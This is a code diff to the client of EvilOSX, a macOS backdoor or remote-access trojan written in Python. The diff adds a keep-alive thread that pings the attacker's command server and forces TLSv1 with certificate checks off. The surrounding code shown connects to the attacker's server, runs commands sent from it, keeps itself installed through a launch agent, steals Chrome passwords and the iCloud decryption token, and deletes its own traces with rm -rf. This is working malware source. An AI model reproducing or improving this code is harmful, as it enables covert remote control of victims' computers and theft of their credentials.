@@ -5,6 +5,7 @@ import ssl
 import os
 import subprocess
 from threading import Timer
+from threading import Thread
 import time
 import platform
 import base64
@@ -136,12 +137,12 @@ def kill_client(root=False):
         execute_command("sudo rm -rf {0}".format(get_launch_agent_file(True)))
         execute_command("sudo rm -rf {0}/".format(get_program_folder(True)))
         execute_command("sudo launchctl remove {0}".format(get_launch_agent_name()))
-        exit()
+        os._exit(1)
     else:
         execute_command("rm -rf {0}".format(get_launch_agent_file()))
         execute_command("rm -rf {0}/".format(get_program_folder()))
         execute_command("launchctl remove {0}".format(get_launch_agent_name()))
-        exit()
+        os._exit(1)
 
 
 def is_root():
@@ -317,6 +318,26 @@ def setup_persistence():
         pass
 
 
+class KeepAlive(Thread):
+    def __init__(self, server_socket):
+        Thread.__init__(self)
+
+        self.server_socket = server_socket
+
+    def run(self):
+        time.sleep(5)
+        print MESSAGE_INFO + "Started keep alive thread."
+
+        while True:
+            try:
+                # Eventually makes the main loop throw socket.error if the connection times out.
+                # Needed because otherwise the client will hang on receive_message.
+                send_response(self.server_socket, "ping")
+                time.sleep(60)
+            except Exception as ex:
+                break
+
+
 def start_server():
     print MESSAGE_INFO + "Starting EvilOSX..."
 
@@ -331,12 +352,14 @@ def start_server():
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.settimeout(None)
 
-        server_socket = ssl.wrap_socket(sock, cert_reqs=ssl.CERT_NONE)
+        server_socket = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1, cert_reqs=ssl.CERT_NONE)
 
         try:
             print MESSAGE_INFO + "Connecting..."
             server_socket.connect((SERVER_HOST, SERVER_PORT))
             print MESSAGE_INFO + "Connected."
+
+            KeepAlive(server_socket).start()
         except socket.error as error:
             if error.errno == 61:
                 print MESSAGE_ATTENTION + "Connection refused."
@@ -362,7 +385,7 @@ def start_server():
                 elif command == "get_computer_name":
                     send_response(server_socket, get_computer_name())
                 elif command == "get_shell_info":
-                    shell_info = execute_command("whoami") + "\n" + get_computer_name() + "\n" + execute_command("pwd")
+                    shell_info = execute_command("whoami") + "\t" + get_computer_name() + "\t" + execute_command("pwd")
 
                     send_response(server_socket, shell_info)
                 elif command == "get_info":
@@ -394,14 +417,11 @@ def start_server():
 
                     if "Error" in output:
                         if "clicked deny" in output:
-                            send_response(server_socket,
-                                          MESSAGE_ATTENTION + "Failed to get chrome passwords, user clicked deny.")
+                            send_response(server_socket, MESSAGE_ATTENTION + "Failed to get chrome passwords, user clicked deny.")
                         elif "entry not found":
-                            send_response(server_socket,
-                                          MESSAGE_ATTENTION + "Failed to get chrome passwords, Chrome not found.")
+                            send_response(server_socket, MESSAGE_ATTENTION + "Failed to get chrome passwords, Chrome not found.")
                         else:
-                            send_response(server_socket,
-                                          MESSAGE_ATTENTION + "Failed to get chrome passwords, unknown error.")
+                            send_response(server_socket, MESSAGE_ATTENTION + "Failed to get chrome passwords, unknown error.")
                     else:
                         send_response(server_socket, output)
 
@@ -414,8 +434,7 @@ def start_server():
                     output = execute_command("python {0}".format(payload_file), False)
 
                     if "Failed to get iCloud" in output:
-                        send_response(server_socket,
-                                      MESSAGE_ATTENTION + "Failed to get iCloud Decryption Key (user clicked deny).")
+                        send_response(server_socket, MESSAGE_ATTENTION + "Failed to get iCloud Decryption Key (user clicked deny).")
                     elif "Failed to find" in output:
                         send_response(server_socket, MESSAGE_ATTENTION + "Failed to find MMeToken file.")
                     else:
@@ -511,19 +530,17 @@ def start_server():
                                 timer.cancel()
                         except socket.error:
                             print MESSAGE_ATTENTION + "Server disconnected, broken pipe."
-                            pass
                         except Exception as ex:
-                            print MESSAGE_ATTENTION + ex.message
-                            send_response(server_socket, str(ex))
+                            send_response(server_socket, MESSAGE_ATTENTION + str(ex))
             except socket.error as ex:
-                print MESSAGE_ATTENTION + "Server disconnected, connection reset ({0}).".format(ex.message)
+                print MESSAGE_ATTENTION + str(ex)
             except Exception as ex:
-                send_response(server_socket, MESSAGE_ATTENTION + ex.message)
+                send_response(server_socket, MESSAGE_ATTENTION + str(ex))
                 continue
 
         try:
             server_socket.close()
-        except:
+        except Exception:
             pass
 
 
